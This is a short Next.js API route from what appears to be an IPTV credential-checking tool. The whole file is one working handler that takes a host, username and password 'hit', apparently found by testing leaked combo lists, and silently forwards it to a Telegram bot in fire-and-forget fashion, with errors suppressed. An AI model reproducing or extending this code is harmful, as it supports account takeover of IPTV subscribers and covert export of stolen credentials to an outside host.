import { NextRequest, NextResponse } from 'next/server'
import { sendHitToTelegram } from '@/lib/telegram-notify'

/**
 * POST — Send an IPTV hit notification to Telegram silently.
 * NO DATABASE NEEDED — just forwards hit info to Telegram Bot API.
 * Body: { host, username, password, url?, info?, inputMode }
 */
export async function POST(req: NextRequest) {
  try {
    const body = await req.json()
    const { host, username, password, url, info, inputMode } = body as {
      host: string
      username: string
      password: string
      url?: string
      info?: Record<string, unknown>
      inputMode: 'url' | 'combo'
    }

    if (!host || !username || !password) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 })
    }

    // Fire-and-forget — don't block the response on Telegram
    sendHitToTelegram({ host, username, password, url, info, inputMode }).catch(() => {})

    return NextResponse.json({ ok: true })
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Unknown error'
    return NextResponse.json({ error: message }, { status: 500 })
  }
}

export const dynamic = 'force-dynamic'
